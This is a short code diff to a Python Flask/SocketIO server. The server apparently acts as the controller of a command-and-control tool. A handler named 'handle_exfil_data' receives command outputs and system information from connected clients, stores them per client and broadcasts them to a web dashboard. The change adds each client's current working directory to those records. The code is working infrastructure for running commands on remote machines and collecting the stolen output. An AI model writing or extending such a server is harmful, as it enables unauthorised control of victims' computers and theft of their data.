@@ -4,7 +4,6 @@ import json
 from datetime import datetime
 from flask import Flask, render_template, request, jsonify, url_for
 from flask_socketio import SocketIO, emit
-import threading
 
 # Server settings
 HOST = "0.0.0.0"
@@ -59,14 +58,16 @@ def handle_exfil_data(data):
                 command_outputs[client_id].append({
                     "command": client_data["command"],
                     "output": client_data["output"],
-                    "timestamp": timestamp
+                    "timestamp": timestamp,
+                    "current_dir": client_data.get("current_dir", "Unknown")
                 })
-            # Broadcast to web interface (omit 'to' to broadcast to all clients)
+            # Broadcast to web interface
             socketio.emit('command_output', {
                 "client_id": client_id,
                 "command": client_data["command"],
                 "output": client_data["output"],
-                "timestamp": timestamp
+                "timestamp": timestamp,
+                "current_dir": client_data.get("current_dir", "Unknown")
             })
         else:
             # Save system info to disk
